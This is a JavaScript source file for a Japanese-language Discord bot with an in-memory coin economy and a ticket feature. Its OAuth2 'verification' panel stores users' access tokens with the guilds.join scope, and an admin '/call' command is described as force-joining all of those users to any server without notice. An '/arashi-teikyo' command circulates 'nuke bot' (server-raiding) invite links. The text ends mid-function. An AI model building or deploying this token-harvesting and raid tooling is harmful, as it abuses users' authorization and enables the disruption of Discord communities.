require('dotenv').config();

const { 
    Client, 
    GatewayIntentBits, 
    SlashCommandBuilder, 
    REST, 
    Routes, 
    PermissionsBitField,
    EmbedBuilder,
    ChannelType,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    InteractionType 
} = require('discord.js');
const axios = require('axios');
const express = require('express');

// 環境変数から設定を取得
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
// GUILD_ID はグローバルコマンドへの切り替えのため削除します。
const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID;
const ARASHI_CHANNEL_ID = process.env.ARASHI_CHANNEL_ID;
const PORT = process.env.PORT || 8000; 

// --- /callとOAuth2用に追加 ---
const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
const OAUTH2_REDIRECT_URI = process.env.OAUTH2_REDIRECT_URI; 

// --- 経済システム (インメモリデータストア) ---
const userBalance = new Map();
const userCooldowns = new Map();

// --- OAuth2 認証済みユーザーデータストア (インメモリデータストア) ---
// Key: Discord User ID (string)
// Value: { accessToken: string }
const authenticatedUsers = new Map(); 

// クールタイム定義 (ミリ秒)
const COOLDOWN_WORK_MS = 60 * 60 * 1000;      // 1時間
const COOLDOWN_ROB_MS = 30 * 60 * 1000;      // 30分
const COOLDOWN_TICKET_MS = 60 * 60 * 1000;   // 1時間
const COOLDOWN_ARASHI_MS = 60 * 60 * 1000;   // 1時間

const ROLE_ADD_COST = 10000;

// --- 認証用グローバル定数 ---
const VERIFY_BUTTON_ID = 'verify_button';
const VERIFY_MODAL_ID = 'verify_modal';
const ANSWER_INPUT_ID = 'answer_input';

// --- 共通ヘルパー関数 ---

function getBalance(userId) {
    return userBalance.get(userId) || 0;
}

function updateBalance(userId, amount) {    
    userBalance.set(userId, amount);
}

function formatCooldown(ms) {
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    
    let parts = [];
    if (hours > 0) parts.push(`${hours}時間`);
    if (minutes > 0) parts.push(`${minutes}分`);
    if (seconds > 0 || parts.length === 0) parts.push(`${seconds}秒`);

    return parts.join(' ');
}

// 共通エラーEmbed関数
function errorEmbed(title, description) {
    return new EmbedBuilder().setColor(0xFF0000).setTitle(title || '❌ エラー').setDescription(description).setTimestamp();
}

// 午前0時のリセット処理
function resetAllData() {
    userBalance.clear();
    userCooldowns.clear();
    // authenticatedUsers はリセットしない (トークンは期限が切れるまで有効なため)
    const timestamp = new Date().toISOString();
    console.log(`[自動リセット] ${timestamp} (UTC) - サーバー時刻の午前0時に経済データとクールダウンがリセットされました。`);
}

function scheduleDailyReset() {
    const now = new Date();
    // UTC時間で次の日の午前0時を設定
    const midnight = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate() + 1, 0, 0, 0, 0));
    
    const timeUntilMidnight = midnight.getTime() - now.getTime();
    
    setTimeout(() => {
        resetAllData();
        scheduleDailyReset();
    }, timeUntilMidnight);

    console.log(`[リセットスケジュール] 次回のリセットは ${midnight.toISOString()} (UTC) にスケジュールされました。`);
}

// --- Discord コマンド定義 ---

const commands = [
    new SlashCommandBuilder()
        .setName('economy')
        .setDescription('エコノミー機能に関するコマンドです。')
        .addSubcommand(subcommand =>
            subcommand
                .setName('work')
                .setDescription('仕事をしてコインを稼ぎます (クールタイム: 1時間)'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('rob')
                .setDescription('他のメンバーからコインを盗もうとします (クールタイム: 30分)')
                .addUserOption(option =>
                    option.setName('target')
                        .setDescription('盗む相手を選択')
                        .setRequired(true)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('balance')
                .setDescription('自分の残高を確認します。'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('role-add')
                .setDescription(`10,000コインでカスタムロールを作成し、自分に付与します。`)
                .addStringOption(option =>
                    option.setName('name')
                        .setDescription('作成するロールの名前')
                        .setRequired(true))
                .addStringOption(option =>
                    option.setName('color')
                        .setDescription('ロールの色 (任意: 16進数 例: FF0000)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('add')
                .setDescription('管理者: 特定のユーザー/ロールにコインを追加します。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('追加する金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを追加する単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを追加する対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('remove')
                .setDescription('管理者: 特定のユーザー/ロールからコインを減らします。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('減らす金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを減らす単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを減らす対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('give')
                .setDescription('他のユーザーにコインを送金します。')
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('送金先のユーザー')
                        .setRequired(true))
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('送金する金額')
                        .setRequired(true)
                        .setMinValue(1))),

    new SlashCommandBuilder()
        .setName('ticket')
        .setDescription('チャンネルにチケットメッセージを送信します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('message')
                .setDescription('送信したいチケットの内容')
                .setRequired(true)),

    new SlashCommandBuilder()
        .setName('arashi-teikyo')
        .setDescription('nuke botのurlを共有チャンネルに提供します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('url')
                .setDescription('提供するbotの導入URL')
                .setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('verify-panel')
        .setDescription('認証パネルをチャンネルに送信します。')
        .addRoleOption(option =>
            option.setName('role')
                .setDescription('認証成功時に付与するロール')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.ManageChannels),

    new SlashCommandBuilder()
        .setName('call')
        .setDescription('OAuth2認証済みの全ユーザーを指定サーバーに強制加入させます（通知なし）。')
        .addStringOption(option =>
            option.setName('guild_id')
                .setDescription('強制加入させたいサーバーのID (必須)')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),

].map(command => command.toJSON());

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages 
    ] 
});

// --- Express Webサーバー設定 ---

const app = express();
app.use(express.json()); 

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    next();
});

app.post('/gas/post', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`[WEBHOOK] ${timestamp} (UTC) --- GASからのPOSTリクエストを受信しました ---`);
    console.log('Received Data (受信したデータ):', req.body);
    console.log('------------------------------------------------------------------------');

    res.status(200).json({ 
        status: 'success', 
        message: 'Webサーバーでデータを受信しました。', 
        data_received: req.body 
    });
});

// OAuth2 Access Token 交換エンドポイント
app.get('/verify', async (req, res) => { 
    const { code } = req.query;

    if (!code) {
        return res.status(400).send('OAuth2認証コードが見つかりません。');
    }

    if (!OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT_URI) {
        return res.status(500).send('サーバー設定エラー: OAuth2環境変数が設定されていません。');
    }
    
    try {
        // 1. Access Tokenを交換
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: OAUTH2_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: OAUTH2_REDIRECT_URI,
            scope: 'identify guilds.join' 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const { access_token, token_type } = tokenResponse.data;

        // 2. ユーザー情報を取得
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        const userId = userResponse.data.id;
        
        // 3. ユーザーIDとAccess Tokenをインメモリに保存
        authenticatedUsers.set(userId, { accessToken: access_token });

        console.log('================================================================');
        console.log(`[OAuth2 認証成功] ユーザーID: ${userId}`);
        console.log(`[OAuth2 トークン] Access Tokenをメモリに保存しました。`);
        console.log('================================================================');
        
        // 4. 認証成功のHTMLを返す
        const successHtml = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証完了 - サーバー強制加入</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1f22; 
            color: #f2f3f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-green-500">
        <svg class="w-20 h-20 mx-auto text-green-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h1 class="text-3xl font-bold text-white mb-4">
            認証が完了しました！
        </h1>
        <p class="text-lg text-gray-300 mb-8">
            Access Tokenの保存に成功しました。<br>Discordの <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドを管理者が実行すると、あなたを含めた全認証済みユーザーがサーバーに**知らないうちに**強制加入させられる可能性があります。
        </p>
        <div class="bg-gray-700 p-4 rounded-lg mb-8">
            <p class="mt-1 text-xl font-medium text-green-300">
                Discordアプリに戻ってください
            </p>
        </div>
        <button onclick="window.close()" 
                class="w-full py-3 px-6 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition duration-200 shadow-md transform hover:scale-[1.01] focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50">
            このウィンドウを閉じる
        </button>
    </div>
</body>
</html>
        `;
        res.status(200).send(successHtml);


    } catch (error) {
        console.error('OAuth2/トークン交換エラー:', error.response?.data || error.message);
        // エラー時もユーザーに分かりやすいメッセージを返す
        const errorHtml = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証エラー</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1f22; 
            color: #f2f3f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-red-500">
        <svg class="w-20 h-20 mx-auto text-red-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h1 class="text-3xl font-bold text-white mb-4">
            認証エラーが発生しました
        </h1>
        <p class="text-lg text-gray-300 mb-8">
            トークンの交換中に問題が発生しました。再度認証を試すか、ボット管理者に連絡してください。
        </p>
        <p class="text-sm text-gray-500 mt-4">
            詳細: ${error.message}
        </p>
    </div>
</body>
</html>
        `;
        res.status(500).send(errorHtml);
    }
});


// --- Discord イベントリスナー ---

client.once('ready', async () => {
    console.log(`[BOT READY] ${new Date().toISOString()} (UTC): Logged in as ${client.user.tag}`);
    scheduleDailyReset();

    // スラッシュコマンド登録処理 (グローバルコマンドに変更)
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('スラッシュコマンドの登録を開始します (グローバルコマンドとして登録中)...');
        // GUILD_ID を使用せず、Global Commands のルートを使用
        const data = await rest.put(
            Routes.applicationCommands(CLIENT_ID), 
            { body: commands },
        );
        console.log(`[スラッシュコマンド登録成功] ${data.length} 個のグローバルコマンドが登録されました。反映には最大1時間かかる場合があります。`);
    } catch (error) {
        // GUILD_ID が undefined のエラーは出なくなるが、その他のAPIエラーに対応
        console.error('スラッシュコマンドの登録エラー:', error);
    }
});

client.on('interactionCreate', async interaction => {
    // 最初の宣言として、ここで userId を定義する (二重宣言を避けるため)
    const userId = interaction.user.id; 
    
    // --- モーダル送信 (verify-panelの応答) ---
    if (interaction.isButton() && interaction.customId === VERIFY_BUTTON_ID) {
        const modal = new ModalBuilder()
            .setCustomId(VERIFY_MODAL_ID)
            .setTitle('認証チャレンジ');

        const answerInput = new TextInputBuilder()
            .setCustomId(ANSWER_INPUT_ID)
            .setLabel("DiscordのOAuth2認証URLを入力してください。")
            .setPlaceholder("URLをブラウザで開いて認証を完了してから、ここに貼り付けてください。")
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true);

        const firstActionRow = new ActionRowBuilder().addComponents(answerInput);
        modal.addComponents(firstActionRow);

        await interaction.showModal(modal);
        return;
    }

    // --- モーダル応答 (OAuth2認証URLの確認) ---
    if (interaction.isModalSubmit() && interaction.customId === VERIFY_MODAL_ID) {
        const url = interaction.fields.getTextInputValue(ANSWER_INPUT_ID).trim();
        
        // 簡易的なURLチェック
        if (!url.startsWith('https://discord.com/oauth2/authorize')) {
            await interaction.reply({ 
                embeds: [errorEmbed('❌ 無効なURL', '入力されたURLはDiscord OAuth2認証URLではありません。')], 
                ephemeral: true 
            });
            return;
        }

        // 認証用ロールIDは、元のパネルメッセージから取得したカスタムIDのメタデータを使用
        // (ここではパネルメッセージのデータがないため、仮に認証済みユーザーに追加されるフラグとして扱います)
        // 実際の運用では、パネルを送信した際にロールIDをカスタムIDなどに埋め込む必要があります。

        // 既にトークンが保存されているかチェック (簡易認証)
        if (authenticatedUsers.has(userId)) {
            await interaction.reply({ 
                embeds: [new EmbedBuilder()
                    .setColor(0x00FF00)
                    .setTitle('✅ 認証成功 (確認済み)')
                    .setDescription('あなたのAccess Tokenは既にボットに保存されています。ロール付与処理を実行します...')
                    .setFooter({ text: 'ロール付与が完了しない場合は管理者に連絡してください。' })
                ], 
                ephemeral: true 
            });
            // ここにロール付与ロジック (interaction.member.roles.add(roleId)) を実装する
        } else {
            await interaction.reply({ 
                embeds: [new EmbedBuilder()
                    .setColor(0xFFA500)
                    .setTitle('⚠️ 認証失敗')
                    .setDescription('Access Tokenが見つかりません。**URLをブラウザで開いて認証を完了したか確認してください。**\n\nもし完了している場合は、ボットが起動してからあなたが認証を完了するまでの間に処理が遅延した可能性があります。時間をおいて再度試すか、管理者に連絡してください。')
                ], 
                ephemeral: true 
            });
        }
        return;
    }


    if (!interaction.isCommand()) return;

    // ログで指摘されていた二重宣言を削除 (ここでは宣言しない)
    // const userId = interaction.user.id; // <-- 削除

    const { commandName } = interaction;

    // --- コマンドハンドリング ---

    if (commandName === 'economy') {
        const subcommand = interaction.options.getSubcommand();

        if (subcommand === 'work') {
            await handleWork(interaction, userId);
        } else if (subcommand === 'rob') {
            await handleRob(interaction, userId);
        } else if (subcommand === 'balance') {
            await handleBalance(interaction, userId);
        } else if (subcommand === 'role-add') {
            await handleRoleAdd(interaction, userId);
        } else if (subcommand === 'add' || subcommand === 'remove') {
            await handleAdminModify(interaction, userId, subcommand);
        } else if (subcommand === 'give') {
            await handleGive(interaction, userId);
        }
    } else if (commandName === 'ticket') {
        await handleTicket(interaction, userId);
    } else if (commandName === 'arashi-teikyo') {
        await handleArashiTeikyo(interaction, userId);
    } else if (commandName === 'verify-panel') {
        await handleVerifyPanel(interaction);
    } else if (commandName === 'call') {
        await handleCall(interaction, userId);
    }
});


// --- 経済システム コマンド実装 ---

async function handleWork(interaction, userId) {
    const lastWork = userCooldowns.get(`work_${userId}`);
    const now = Date.now();

    if (lastWork && now < lastWork + COOLDOWN_WORK_MS) {
        const remaining = (lastWork + COOLDOWN_WORK_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の仕事まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    const earned = Math.floor(Math.random() * (500 - 100 + 1)) + 100; // 100〜500
    updateBalance(userId, getBalance(userId) + earned);
    userCooldowns.set(`work_${userId}`, now);

    const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💼 仕事完了！')
        .setDescription(`仕事を頑張り、**${earned.toLocaleString()}** コインを稼ぎました。`)
        .addFields({ name: '現在の残高', value: `${getBalance(userId).toLocaleString()} コイン` })
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleRob(interaction, userId) {
    const targetUser = interaction.options.getUser('target');
    
    if (userId === targetUser.id) {
        return interaction.reply({ embeds: [errorEmbed('自分自身を盗むことはできません。')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('ボットを盗むことはできません。')], ephemeral: true });
    }
    
    // クールダウンチェック
    const lastRob = userCooldowns.get(`rob_${userId}`);
    const now = Date.now();

    if (lastRob && now < lastRob + COOLDOWN_ROB_MS) {
        const remaining = (lastRob + COOLDOWN_ROB_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の強盗まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    userCooldowns.set(`rob_${userId}`, now);

    const targetBalance = getBalance(targetUser.id);

    // 強盗失敗 (50%の確率)
    if (Math.random() < 0.5) {
        const fine = Math.min(100, getBalance(userId)); // 最大100コインの罰金
        updateBalance(userId, getBalance(userId) - fine);
        
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('🚨 強盗失敗！')
            .setDescription(`強盗は失敗し、警備員に見つかりました！**${fine.toLocaleString()}** コインの罰金を支払いました。`)
            .addFields({ name: '現在の残高', value: `${getBalance(userId).toLocaleString()} コイン` })
            .setTimestamp();

        return interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 強盗成功
    if (targetBalance === 0) {
        const embed = new EmbedBuilder()
            .setColor(0xFFA500)
            .setTitle('💰 強盗成功！...だが')
            .setDescription(`${targetUser.username} を襲いましたが、残念ながら彼/彼女は一文無しでした。何も盗めませんでした。`)
            .setTimestamp();
        
        return interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 盗む金額: ターゲットの残高の10%〜30%
    const stolenAmount = Math.floor(targetBalance * (Math.random() * 0.2 + 0.1)); // 0.1 ~ 0.3
    
    updateBalance(userId, getBalance(userId) + stolenAmount);
    updateBalance(targetUser.id, targetBalance - stolenAmount);

    const embed = new EmbedBuilder()
        .setColor(0x00FFFF)
        .setTitle('🔪 強盗成功！')
        .setDescription(`あなたは ${targetUser.username} から見事に**${stolenAmount.toLocaleString()}** コインを盗みました！`)
        .addFields(
            { name: 'あなたの残高', value: `${getBalance(userId).toLocaleString()} コイン`, inline: true },
            { name: `${targetUser.username}の残高`, value: `${getBalance(targetUser.id).toLocaleString()} コイン`, inline: true }
        )
        .setTimestamp();

    await interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
}

async function handleBalance(interaction, userId) {
    const balance = getBalance(userId);

    const embed = new EmbedBuilder()
        .setColor(0x007FFF)
        .setTitle('🏦 残高照会')
        .setDescription(`あなたの現在の残高は **${balance.toLocaleString()}** コインです。`)
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleRoleAdd(interaction, userId) {
    const roleName = interaction.options.getString('name');
    const colorInput = interaction.options.getString('color');
    const cost = ROLE_ADD_COST;
    const currentBalance = getBalance(userId);

    if (currentBalance < cost) {
        return interaction.reply({ 
            embeds: [errorEmbed(`ロール作成に必要な **${cost.toLocaleString()}** コインが足りません。`)
                .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
            ephemeral: true 
        });
    }

    let roleColor = 'DEFAULT';
    if (colorInput) {
        // 16進数チェック (簡単なバリデーション)
        if (/^#?[0-9A-Fa-f]{6}$/.test(colorInput)) {
            roleColor = colorInput.startsWith('#') ? colorInput.substring(1) : colorInput;
            roleColor = parseInt(roleColor, 16);
        } else {
            return interaction.reply({ 
                embeds: [errorEmbed('❌ 無効な色コード', '色コードは6桁の16進数 (例: FF0000 または #FF0000) で指定してください。')], 
                ephemeral: true 
            });
        }
    }

    try {
        // ロールの作成
        const newRole = await interaction.guild.roles.create({
            name: roleName,
            color: roleColor,
            reason: `ユーザー: ${interaction.user.tag} による ${cost.toLocaleString()} コインでのロール購入`,
            permissions: [], // デフォルトで権限なし
        });

        // ユーザーにロールを付与
        await interaction.member.roles.add(newRole);

        // 残高からコストを減算
        updateBalance(userId, currentBalance - cost);
        
        const embed = new EmbedBuilder()
            .setColor(newRole.color || 0x00FF00)
            .setTitle('✨ カスタムロール作成・付与完了')
            .setDescription(`${newRole.name} ロールを **${cost.toLocaleString()}** コインで購入し、付与しました。`)
            .addFields(
                { name: '新しい残高', value: `${getBalance(userId).toLocaleString()} コイン`, inline: true },
                { name: 'ロールの色', value: `#${newRole.hexColor.substring(1)}`, inline: true }
            )
            .setTimestamp();

        await interaction.reply({ embeds: [embed] });

    } catch (error) {
        console.error('ロール作成エラー:', error);
        await interaction.reply({ embeds: [errorEmbed('❌ ロール作成失敗', 'ロールの作成中にエラーが発生しました。ボットにロール管理権限があるか確認してください。')], ephemeral: true });
    }
}

async function handleAdminModify(interaction, userId, subcommand) {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドは管理者のみが使用できます。')], ephemeral: true });
    }

    const amount = interaction.options.getInteger('money');
    const targetUser = interaction.options.getUser('user');
    const targetRole = interaction.options.getRole('role');
    
    if (!targetUser && !targetRole) {
        return interaction.reply({ embeds: [errorEmbed('対象指定エラー', 'ユーザーまたはロールのどちらか一方を指定してください。')], ephemeral: true });
    }
    if (targetUser && targetRole) {
        return interaction.reply({ embeds: [errorEmbed('対象指定エラー', 'ユーザーとロールを同時に指定することはできません。')], ephemeral: true });
    }

    let affectedUsers = [];
    let title;
    let color;

    if (targetUser) {
        affectedUsers.push(targetUser);
    } else if (targetRole) {
        const members = await interaction.guild.members.fetch();
        affectedUsers = members.filter(member => member.roles.cache.has(targetRole.id)).map(member => member.user);
    }

    if (subcommand === 'add') {
        title = `➕ コイン追加 (${amount.toLocaleString()} コイン)`;
        color = 0x00FF00;
        affectedUsers.forEach(user => {
            updateBalance(user.id, getBalance(user.id) + amount);
        });
    } else { // remove
        title = `➖ コイン削除 (${amount.toLocaleString()} コイン)`;
        color = 0xFF0000;
        affectedUsers.forEach(user => {
            const newBalance = Math.max(0, getBalance(user.id) - amount);
            updateBalance(user.id, newBalance);
        });
    }

    const description = targetUser 
        ? `${targetUser.username} の残高を操作しました。`
        : `${targetRole.name} ロールを持つ **${affectedUsers.length}人** の残高を操作しました。`;

    const embed = new EmbedBuilder()
        .setColor(color)
        .setTitle(title)
        .setDescription(description)
        .addFields({ name: '操作者', value: interaction.user.tag, inline: true })
        .addFields({ name: '影響を受けた人数', value: affectedUsers.length.toLocaleString(), inline: true })
        .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });
}

async function handleGive(interaction, userId) {
    const targetUser = interaction.options.getUser('user');
    const amount = interaction.options.getInteger('money');
    const currentBalance = getBalance(userId);

    if (userId === targetUser.id) {
        return interaction.reply({ embeds: [errorEmbed('自分自身に送金することはできません。')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('ボットに送金することはできません。')], ephemeral: true });
    }

    if (currentBalance < amount) {
        return interaction.reply({ 
            embeds: [errorEmbed(`送金に必要な **${amount.toLocaleString()}** コインが足りません。`)
                .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
            ephemeral: true 
        });
    }

    const targetBalance = getBalance(targetUser.id);
    
    const newSenderBalance = currentBalance - amount;
    const newReceiverBalance = targetBalance + amount;

    updateBalance(userId, newSenderBalance);
    updateBalance(targetUser.id, newReceiverBalance);

    const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💰 コイン送金完了')
        .setDescription(`**${amount.toLocaleString()}** コインを ${targetUser.username} に送金しました。`)
        .addFields(
            { name: 'あなたの残高 (送金後)', value: `${newSenderBalance.toLocaleString()} コイン`, inline: true },
            { name: `${targetUser.username}の残高 (受領後)`, value: `${newReceiverBalance.toLocaleString()} コイン`, inline: true }
        )
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}


// --- チャンネル投稿システム コマンド実装 ---

async function handleTicket(interaction, userId) {
    const lastTicket = userCooldowns.get(`ticket_${userId}`);
    const now = Date.now();
    
    if (lastTicket && now < lastTicket + COOLDOWN_TICKET_MS) {
        const remaining = (lastTicket + COOLDOWN_TICKET_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次のチケット投稿まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    if (!TICKET_CHANNEL_ID) {
        return interaction.reply({ embeds: [errorEmbed('設定エラー', 'チケット投稿チャンネルID (TICKET_CHANNEL_ID) が設定されていません。')], ephemeral: true });
    }

    const message = interaction.options.getString('message');
    const ticketChannel = await client.channels.fetch(TICKET_CHANNEL_ID);

    if (!ticketChannel || ticketChannel.type !== ChannelType.GuildText) {
        return interaction.reply({ embeds: [errorEmbed('チャンネルエラー', 'チケット投稿チャンネルが無効です。IDを確認してください。')], ephemeral: true });
    }

    const embed = new EmbedBuilder()
        .setColor(0x007FFF)
        .setTitle('🎫 報告チケット')
        .setAuthor({ name: interaction.user.tag, iconURL: interaction.user.displayAvatarURL() })
        .setDescription(message)
        .setTimestamp()
        .setFooter({ text: `User ID: ${userId}` });

    try {
        await ticketChannel.send({ embeds: [embed] });
        
        userCooldowns.set(`ticket_${userId}`, now);
        await interaction.reply({ 
            embeds: [new EmbedBuilder()
                .setColor(0x00FF00)
                .setDescription(`チケットメッセージを <#${TICKET_CHANNEL_ID}> に送信しました。`)
            ],
            ephemeral: true
        });
    } catch (error) {
        console.error('チケット送信エラー:', error);
        await interaction.reply({ embeds: [errorEmbed('投稿エラー', 'チャンネルにメッセージを送信できませんでした。ボットの権限を確認してください。')], ephemeral: true });
    }
}

async function handleArashiTeikyo(interaction, userId) {
    const lastArashi = userCooldowns.get(`arashi_${userId}`);
    const now = Date.now();
    
    if (lastArashi && now < lastArashi + COOLDOWN_ARASHI_MS) {
        const remaining = (lastArashi + COOLDOWN_ARASHI_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の提供まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    if (!ARASHI_CHANNEL_ID) {
        return interaction.reply({ embeds: [errorEmbed('設定エラー', '提供チャンネルID (ARASHI_CHANNEL_ID) が設定されていません。')], ephemeral: true });
    }

    const url = interaction.options.getString('url');
    // URLの簡単なバリデーション
    if (!url.startsWith('http')) {
        return interaction.reply({ embeds: [errorEmbed('URLエラー', '有効なURLを入力してください。')], ephemeral: true });
    }

    const arashiChannel = await client.channels.fetch(ARASHI_CHANNEL_ID);

    if (!arashiChannel || arashiChannel.type !== ChannelType.GuildText) {
        return interaction.reply({ embeds: [errorEmbed('チャンネルエラー', '提供チャンネルが無効です。IDを確認してください。')], ephemeral: true });
    }

    const embed = new EmbedBuilder()
        .setColor(0xFF4500)
        .setTitle('🚨 Nuke Bot URL 提供')
        .setAuthor({ name: interaction.user.tag, iconURL: interaction.user.displayAvatarURL() })
        .setDescription(`提供された Nuke Bot 導入URL: \`${url}\``)
        .addFields({ name: '提供者ID', value: userId, inline: true })
        .setTimestamp()
        .setFooter({ text: '安全を確認の上、ご利用ください。' });

    try {
        await arashiChannel.send({ embeds: [embed] });
        
        userCooldowns.set(`arashi_${userId}`, now);
        await interaction.reply({ 
            embeds: [new EmbedBuilder()
                .setColor(0x00FF00)
                .setDescription(`URLを <#${ARASHI_CHANNEL_ID}> に共有しました。`)
            ],
            ephemeral: true
        });
    } catch (error) {
        console.error('URL提供エラー:', error);
        await interaction.reply({ embeds: [errorEmbed('投稿エラー', 'チャンネルにメッセージを送信できませんでした。ボットの権限を確認してください。')], ephemeral: true });
    }
}

async function handleVerifyPanel(interaction) {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
        return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドはチャンネル管理権限を持つユーザーのみが使用できます。')], ephemeral: true });
    }

    const role = interaction.options.getRole('role');
    
    // OAuth2認証URL
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(OAUTH2_REDIRECT_URI)}&scope=identify%20guilds.join`;

    const embed = new EmbedBuilder()
        .setColor(0x7289DA)
        .setTitle('🔐 サーバー認証パネル')
